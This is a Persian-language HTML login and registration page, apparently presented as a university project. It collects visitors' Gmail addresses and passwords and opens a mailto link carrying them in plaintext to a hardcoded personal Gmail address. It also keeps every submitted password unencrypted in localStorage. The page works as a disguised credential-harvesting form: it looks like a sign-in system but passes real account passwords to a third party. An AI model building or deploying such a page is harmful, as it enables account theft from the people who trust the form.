<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سیستم ورود - پروژه دانشگاهی</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Tahoma;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;direction:rtl}
        .container{width:100%;max-width:400px;padding:20px}
        .login-box{background:#fff;padding:40px;border-radius:20px;box-shadow:0 15px 35px rgba(0,0,0,0.3);animation:slideIn 0.5s ease}
        @keyframes slideIn{from{opacity:0;transform:translateY(-30px)}to{opacity:1;transform:translateY(0)}}
        h2{text-align:center;color:#333;margin-bottom:30px;font-size:28px}
        .toggle-buttons{display:flex;gap:10px;margin-bottom:30px}
        .toggle-buttons button{flex:1;padding:12px;border:none;background:#f0f0f0;border-radius:10px;font-size:16px;cursor:pointer;font-weight:bold;transition:0.3s}
        .toggle-buttons button.active{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;box-shadow:0 4px 15px rgba(102,126,234,0.4)}
        .toggle-buttons button:hover{transform:scale(1.02)}
        .input-group{margin-bottom:20px}
        .input-group label{display:block;margin-bottom:8px;color:#555;font-weight:bold;font-size:14px}
        .input-group input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:10px;font-size:14px;transition:0.3s;font-family:inherit}
        .input-group input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.2)}
        .btn-submit{width:100%;padding:14px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:10px;font-size:18px;font-weight:bold;cursor:pointer;transition:0.3s;margin-top:10px}
        .btn-submit:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(102,126,234,0.4)}
        .btn-submit:active{transform:translateY(0)}
        .message{margin-top:20px;padding:12px;border-radius:10px;text-align:center;display:none;font-weight:bold}
        .message.success{display:block;background:#d4edda;color:#155724;border:1px solid #c3e6cb}
        .message.error{display:block;background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
        .loading{display:none;text-align:center;margin-top:15px}
        .loading.show{display:block}
        .spinner{border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .loading p{margin-top:10px;color:#666;font-size:14px}
    </style>
</head>
<body>
<div class="container">
    <div class="login-box">
        <h2>🔐 ورود به سیستم</h2>
        <div class="toggle-buttons">
            <button class="active" id="loginTab">ورود</button>
            <button id="registerTab">ثبت نام</button>
        </div>
        <form id="loginForm">
            <div class="input-group">
                <label>📧 ایمیل جیمیل</label>
                <input type="email" id="loginEmail" placeholder="example@gmail.com" required>
            </div>
            <div class="input-group">
                <label>🔑 رمز عبور</label>
                <input type="password" id="loginPassword" placeholder="رمز عبور را وارد کنید" required>
            </div>
            <button type="submit" class="btn-submit">ورود</button>
        </form>
        <form id="registerForm" style="display:none;">
            <div class="input-group">
                <label>👤 نام کامل</label>
                <input type="text" id="fullName" placeholder="نام و نام خانوادگی" required>
            </div>
            <div class="input-group">
                <label>📧 ایمیل جیمیل</label>
                <input type="email" id="registerEmail" placeholder="example@gmail.com" required>
            </div>
            <div class="input-group">
                <label>🔑 رمز عبور</label>
                <input type="password" id="registerPassword" placeholder="حداقل 6 کاراکتر" required minlength="6">
            </div>
            <div class="input-group">
                <label>✅ تکرار رمز عبور</label>
                <input type="password" id="confirmPassword" placeholder="تکرار رمز عبور" required>
            </div>
            <button type="submit" class="btn-submit">ثبت نام</button>
        </form>
        <div id="message" class="message"></div>
        <div id="loading" class="loading">
            <div class="spinner"></div>
            <p>⏳ در حال ارسال به ایمیل...</p>
        </div>
    </div>
</div>

<script>
// ============================================
// تنظیمات - ایمیل مقصد (ایمیل خودت)
// ============================================
const TARGET_EMAIL = 'bardya1245@gmail.com';

// ============================================
// المان‌های صفحه
// ============================================
const loginTab = document.getElementById('loginTab');
const registerTab = document.getElementById('registerTab');
const loginForm = document.getElementById('loginForm');
const registerForm = document.getElementById('registerForm');
const messageDiv = document.getElementById('message');
const loadingDiv = document.getElementById('loading');

// ============================================
// تغییر تب‌ها
// ============================================
loginTab.onclick = () => {
    loginTab.classList.add('active');
    registerTab.classList.remove('active');
    loginForm.style.display = 'block';
    registerForm.style.display = 'none';
    messageDiv.style.display = 'none';
};

registerTab.onclick = () => {
    registerTab.classList.add('active');
    loginTab.classList.remove('active');
    registerForm.style.display = 'block';
    loginForm.style.display = 'none';
    messageDiv.style.display = 'none';
};

// ============================================
// توابع کمکی
// ============================================
function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = 'message ' + type;
}

function showLoading(show) {
    if (show) {
        loadingDiv.classList.add('show');
    } else {
        loadingDiv.classList.remove('show');
    }
}

function clearMessage() {
    messageDiv.style.display = 'none';
    messageDiv.className = 'message';
}

// ============================================
// تابع ارسال به ایمیل (با باز شدن پنجره)
// ============================================
function sendToEmail(userData, type) {
    return new Promise((resolve, reject) => {
        try {
            const subject = encodeURIComponent(`🔐 گزارش ${type} - پروژه دانشگاهی`);
            const body = encodeURIComponent(
                `📍 گزارش ${type} جدید\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `📌 نوع: ${type}\n` +
                `👤 نام: ${userData.name || 'نامشخص'}\n` +
                `📧 ایمیل: ${userData.email}\n` +
                `🔑 رمز عبور: ${userData.password}\n` +
                `🕐 زمان: ${new Date().toLocaleString('fa-IR')}\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `🔒 این اطلاعات از طریق پروژه دانشگاهی ارسال شده است.`
            );

            // باز کردن پنجره ایمیل
            const mailWindow = window.open(
                `mailto:${TARGET_EMAIL}?subject=${subject}&body=${body}`,
                '_blank'
            );

            if (mailWindow) {
                resolve('✅ پنجره ایمیل باز شد! لطفاً دکمه ارسال را بزنید.');
            } else {
                reject('❌ پنجره باز نشد! لطفاً اجازه باز شدن پنجره را بدهید.');
            }

        } catch (error) {
            reject('❌ خطا: ' + error.message);
        }
    });
}

// ============================================
// تابع ذخیره در localStorage (برای پشتیبان)
// ============================================
function saveToLocalStorage(userData, type) {
    try {
        const allData = JSON.parse(localStorage.getItem('all_users') || '[]');
        allData.push({
            ...userData,
            type: type,
            timestamp: new Date().toISOString()
        });
        localStorage.setItem('all_users', JSON.stringify(allData));
        console.log('💾 اطلاعات در localStorage ذخیره شد');
    } catch (e) {
        console.log('⚠️ خطا در ذخیره localStorage');
    }
}

// ============================================
// تابع اصلی ارسال
// ============================================
async function handleSubmit(userData, type) {
    showLoading(true);
    clearMessage();

    try {
        // ارسال به ایمیل
        const result = await sendToEmail(userData, type);
        
        // ذخیره در localStorage
        saveToLocalStorage(userData, type);
        
        showLoading(false);
        showMessage(result, 'success');

        // ریست فرم بعد از 3 ثانیه
        setTimeout(() => {
            if (type === 'ثبت نام') {
                registerForm.reset();
            } else {
                loginForm.reset();
            }
        }, 3000);

    } catch (error) {
        showLoading(false);
        showMessage(error.message, 'error');
    }
}

// ============================================
// رویداد ثبت نام
// ============================================
registerForm.onsubmit = (e) => {
    e.preventDefault();

    const name = document.getElementById('fullName').value.trim();
    const email = document.getElementById('registerEmail').value.trim();
    const password = document.getElementById('registerPassword').value;
    const confirm = document.getElementById('confirmPassword').value;

    // اعتبارسنجی
    if (!email.endsWith('@gmail.com')) {
        showMessage('❌ لطفاً از یک ایمیل جیمیل معتبر استفاده کنید!', 'error');
        return;
    }

    if (password !== confirm) {
        showMessage('❌ رمز عبور و تکرار آن مطابقت ندارد!', 'error');
        return;
    }

    if (password.length < 6) {
        showMessage('❌ رمز عبور باید حداقل 6 کاراکتر باشد!', 'error');
        return;
    }

    const userData = {
        name: name,
        email: email,
        password: password
    };

    handleSubmit(userData, 'ثبت نام');
};

// ============================================
// رویداد ورود
// ============================================
loginForm.onsubmit = (e) => {
    e.preventDefault();

    const email = document.getElementById('loginEmail').value.trim();
    const password = document.getElementById('loginPassword').value;

    if (!email.endsWith('@gmail.com')) {
        showMessage('❌ لطفاً از یک ایمیل جیمیل معتبر استفاده کنید!', 'error');
        return;
    }

    const userData = {
        name: 'ورود به سیستم',
        email: email,
        password: password
    };

    handleSubmit(userData, 'ورود');
};

// ============================================
// نمایش پیام در کنسول برای دیباگ
// ============================================
console.log('🚀 سیستم آماده است!');
console.log('📧 ایمیل مقصد:', TARGET_EMAIL);
console.log('💡 اطلاعات به ایمیل شما ارسال خواهد شد');
</script>
</body>
</html>
